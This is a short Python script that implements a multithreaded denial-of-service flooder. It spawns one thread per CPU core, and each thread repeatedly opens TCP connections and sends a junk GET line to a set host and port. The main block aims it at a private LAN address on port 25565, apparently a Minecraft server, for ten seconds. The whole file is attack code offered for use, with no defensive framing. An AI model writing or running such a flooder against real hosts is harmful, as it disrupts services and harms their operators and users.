import socket
from threading import Thread
from time import sleep
import os
running = True


class DenialOfService():
    ip = str
    port = int
    running = True

    def __init__(self, console):
        # self.console = console
        pass

    def start(self):
        self.running=True
        for i in range(os.cpu_count()):
            t = Thread(target=self.dos)
            t.start()

    def stop(self):
        self.running = False

    def setIp(self, ip):
        self.ip = ip

    def setPort(self, port):
        self.port = port

    def dos(self):
        while self.running:
            mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                mysocket.connect((self.ip, self.port))
                mysocket.send(str.encode("GET " + "Haha, DOS!!!" + "HTTP/1.1 \r\n"))
                mysocket.sendto(str.encode("GET " + "Haha, DOS!!!" + "HTTP/1.1 \r\n"), (self.ip, self.port))
                print("DOS")
            except socket.error:
                print("error")
            mysocket.close()


if __name__ == '__main__':
    dos = DenialOfService()
    dos.setIp("192.168.178.57")
    dos.setPort(25565)
    dos.start()
    sleep(10)
    dos.stop()
'''
    try:
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("192.168.178.57", 25565))
        sock.send("Hi".encode())
        sock.sendto("Hi".encode(),("192.168.178.57", 25565))
        print("Ende")
    except:
        print("Nö")
'''